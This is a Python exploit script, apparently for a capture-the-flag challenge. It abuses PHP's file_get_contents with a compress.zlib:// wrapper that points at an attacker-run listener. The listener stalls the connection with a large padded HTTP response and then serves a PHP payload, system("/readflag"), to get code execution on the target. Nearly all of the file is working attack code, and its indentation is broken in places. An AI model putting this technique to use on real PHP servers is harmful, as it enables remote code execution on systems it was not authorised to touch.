import socket
import re
import threading
import time
# Usage Secenes: File_get_contentes to upload tmp file

def job(conn,addr):
    time.sleep(0.26)
    phpcode = 'wtf<?php system("/readflag");?>'
    conn.sendall(phpcode)
    print("[DEBUG]:thread joinging")

for gg in range(1):

    r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    r.connect(('challeng_host',8004))

    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.bind(('0.0.0.0', 5487))
    c.listen(100)


    data = '''name={}&file=compress.zlib://http://vps:5487'''.format("a" * 8050)

    payload = '''POST / HTTP/1.1
Host: vps:8004
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Length: {}
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1

{}'''.format(len(data), data).replace("\n", "\r\n")

    r.send(payload)
    #r.recvuntil("your sandbox: ")
    #dirname = r.recv(1024)

    recevied_size  = 0
    recevied_data = b''  

    while recevied_size < 8200:  
        cmd_res = r.recv(1024)
        recevied_size += len(cmd_res) 
        recevied_data += cmd_res
    else:
        dirname = re.findall(r"files/\w{64}",recevied_data)[0]
        #print(recevied_data.decode("utf-8","ignore"))
        #print("cmd res receive done ....",recevied_size)

    print("[DEBUG]:" + dirname)

    # send trash on socket 

    resp = '''HTTP/1.1 200 OK
Date: Sun, 29 Dec 2019 05:22:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 534
Content-Type: text/html; charset=UTF-8

{}'''.format('A'*1000000).replace("\n","\r\n")

    while True:
		conn, addr = c.accept()
	# request = conn.recv(1024)
		print "[debug]:recieve from:",addr
		conn.sendall(resp)
        	t = threading.Thread(target = job, args=(conn, addr))
        	t.start()
        	t.join()
    conn.close()
    r.close()
    c.close()